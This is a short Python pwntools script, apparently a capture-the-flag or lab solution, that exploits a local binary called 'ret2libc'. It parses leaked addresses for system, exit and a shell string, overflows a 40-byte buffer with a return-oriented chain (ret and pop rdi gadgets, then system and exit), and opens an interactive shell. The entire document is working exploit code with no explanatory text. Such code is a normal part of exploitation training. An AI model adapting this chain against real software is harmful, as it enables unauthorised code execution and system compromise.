#!/usr/bin/python
import pwn

proc = pwn.process("./ret2libc")

proc.recvuntil(b"System address: ")
sys_addr = proc.recvline().decode("utf-8").strip()
print("system addr =", sys_addr)

sys_addr = int(sys_addr, 16)

proc.recvuntil(b"Exit address: ")

exit_addr = proc.recvline().decode("utf-8").strip()
print("exit addr =", exit_addr)

exit_addr = int(exit_addr, 16)

proc.recvuntil(b"SHELL address: ")

sh_addr = proc.recvline().decode("utf-8").strip()
print("sh addr =", sh_addr)

sh_addr = int(sh_addr, 16)

buf = (
    b"a" * 40
    + pwn.p64(0x00474db3) #ret gadget
    + pwn.p64(0x00474db2) #pop rdi; ret
    + pwn.p64(sh_addr) #pop shell code into rdi
    # + pwn.p64(0x455b80) #execve
    + pwn.p64(sys_addr) #system
    + pwn.p64(exit_addr) #exit
)

proc.sendline(buf)
proc.interactive()

